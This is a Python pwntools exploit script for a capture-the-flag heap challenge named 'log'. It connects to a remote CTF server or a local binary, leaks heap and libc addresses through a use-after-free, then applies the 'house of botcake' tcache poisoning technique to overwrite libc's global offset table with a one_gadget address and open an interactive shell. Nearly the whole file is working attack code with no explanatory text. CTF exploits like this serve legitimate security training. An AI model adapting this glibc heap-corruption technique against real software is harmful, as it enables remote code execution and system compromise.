#!/usr/bin/python3

from pwn import *

HOST = "log.challs.teamitaly.eu"
PORT = 29006

vuln = ELF("./log")
libc = ELF("./libc.so.6")

ONE_GADGETS = [
    0x50a37, 0xebcf1, 0xebcf5, 0xebcf8
]

def start():
    global p
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process("./log_patched")

def recvmsg() -> tuple[int, bytes]:
    global p
    msgtype = u32(p.recvn(4))
    msglen = u32(p.recvn(4))
    msg = p.recvn(msglen)
    return msgtype, msg

def menu(choice:int) -> None:
    mtype, _ = recvmsg()
    assert mtype == 100
    p.send(p32(choice))

def add_req(size:int, req:bytes) -> None:
    menu(0)
    p.send(p32(size))
    req += (size - len(req))*b"\0"
    p.send(req)
    mtype, _ = recvmsg()
    assert mtype == 0

def show_req(idx:int) -> bytes:
    menu(1)
    p.send(p32(idx))
    mtype, m = recvmsg()
    assert mtype == 0
    return m

def remove_req(idx:int) -> None:
    menu(2)
    p.send(p32(idx))
    mtype, _ = recvmsg()
    assert mtype == 0

def save_log() -> None:
    menu(3)
    mtype, _ = recvmsg()
    assert mtype == 0


#context.log_level = "DEBUG"
start()
#pause()

#house of botcake, see https://nasm.re/posts/catastrophe/#house-of-botcake
add_req(0x100, b"A")
remove_req(0)
heap = unpack(show_req(0)[:5], "all") << 12
log.info(f'heap: {hex(heap)}')
for i in range(7):
    add_req(0x100, bytes([ord('A') + i]*0x100))
add_req(0x100, b"prev")
add_req(0x100, b"a")

for _ in range(7):
    remove_req(1)

remove_req(2) #a -> unsorted bin
remove_req(1) #prev

libc.address = u64(show_req(2)[:8]) - 0x219ce0
log.info(f"Libc: {hex(libc.address)}")

add_req(0x100, b"truc") #allocated from tcache
remove_req(2) #a -> tcache

#size adapted because another array alloced in the chunk
add_req(0x130, b"T"*0xc8 + p64(0x111) + p64(libc.symbols["_GLOBAL_OFFSET_TABLE_"] ^ (heap >> 12))) #prev
add_req(0x100, b"pop a from tcache")

add_req(0x100, p64(libc.address + ONE_GADGETS[1])*0x20)
#add_req(0x100, p64(0xdeadbeef)*0x20)

#do add_req(0x50, b"trololo"), but can't use the wrapper because we do not receive a success message
menu(0)
p.send(p32(0x50))
req = b"trololo"
req += (0x50 - len(req))*b"\0"
p.send(req)

p.interactive()